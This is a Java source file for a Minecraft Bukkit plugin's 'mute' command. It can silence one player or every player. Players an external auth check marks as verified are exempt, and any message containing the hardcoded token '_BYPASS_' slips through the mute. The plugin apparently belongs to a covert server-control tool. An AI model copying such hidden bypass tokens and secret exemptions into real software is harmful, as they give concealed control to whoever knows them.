package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class Mute implements Command, Listener {
    private final ArrayList<UUID> toggled = new ArrayList<>();
    private boolean allMuted = false;
    private Z_ z;

    @Override
    public String[] getCommands() {
        return new String[]{"mute"};
    }

    @Override
    public String getDescription() {
        return "Prevents the player from running commands or typing in chat.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Usage: mute <player | *>");
            return;
        }

        if (args[0].equals("*")) {
            this.allMuted = !this.allMuted;
            if (!allMuted) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "All players are no longer muted!");
            } else {
                sender.sendMessage(Colors.Prefix + Colors.Success + "All players are now muted!");
            }

            return;
        }

        Player found = Bukkit.getPlayer(args[0]);
        if (found == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player could not be found!");
            return;
        }

        if (toggled.contains(found.getUniqueId())) {
            toggled.remove(found.getUniqueId());
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Unmuted " + found.getName() + "!");
            return;
        }

        toggled.add(found.getUniqueId());
        sender.sendMessage(Colors.Prefix + Colors.Success + "Muted " + found.getName() + "!");
    }

    @Override
    public void onEnable(Z_ z) {
        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    private boolean isMuted(Player p) throws IOException, InterruptedException {
        if (toggled.contains(p.getUniqueId())) {
            return true;
        }

        return this.allMuted && !this.z.getAuth().isVerified(p.getName());
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    private void onChat(AsyncPlayerChatEvent e) throws IOException, InterruptedException {
        if (this.isMuted(e.getPlayer())) {
            if (e.getMessage().contains("_BYPASS_")) {
                e.setMessage(e.getMessage().replaceAll("_BYPASS_", ""));
                return;
            }

            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    private void onCommand(PlayerCommandPreprocessEvent e) throws IOException, InterruptedException {
        if (this.isMuted(e.getPlayer())) {
            if (e.getMessage().contains("_BYPASS_")) {
                e.setMessage(e.getMessage().replaceAll("_BYPASS_", ""));
                return;
            }

            e.setCancelled(true);
        }
    }
}
